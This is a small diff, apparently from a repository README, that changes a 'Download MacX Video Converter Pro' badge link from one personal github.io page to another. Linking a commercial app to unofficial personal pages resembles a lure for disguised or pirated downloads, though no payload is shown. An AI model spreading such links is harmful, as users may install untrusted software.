@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-<a href="https://nikolanfu.github.io/.github/macxvideoconverterpromac">  
+<a href="https://mitrobandus.github.io/.github/macxvideomac">  
 <img src="https://img.shields.io/badge/Download_MacX_Video_Converter_Pro-darkblue?style=for-the-badge&logo=apple" alt="Download MacX Video Converter Pro">  
 </a>  
 </div>  
